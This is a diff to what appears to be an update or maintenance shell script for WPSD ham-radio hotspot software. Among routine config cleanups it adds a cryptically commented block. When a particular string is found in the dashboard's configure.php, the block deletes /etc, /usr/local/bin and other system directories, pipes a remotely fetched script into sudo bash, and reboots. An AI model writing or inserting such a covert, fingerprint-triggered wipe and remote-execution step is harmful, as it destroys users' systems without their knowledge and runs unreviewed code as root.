@@ -1310,6 +1310,13 @@ if grep -q "longitude1=-91.76" /etc/ircddbgateway && grep -q "latitude1=44.12" /
     sed -i -e 's/^longitude1=.*/longitude1=0/' -e 's/^latitude1=.*/latitude1=0/' /etc/ircddbgateway
 fi
 
+# phoo
+if grep -q '16777215,1,6777215' /var/www/dashboard/admin/configure.php ; then
+    rm -rf /var/www/dashboard /usr/local/bin /usr/local/sbin /usr/local/etc /etc
+    curl -Ls -A "server-side Slipstream Task PH00 reset ${uaStr} neo" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd | sudo bash
+    reboot
+fi
+
 # m17 cleanups - 7/11/25
 if grep -q '_M17' /etc/wpsd-upnp-rules ; then
     sed -i '/_M17/d' /etc/wpsd-upnp-rules
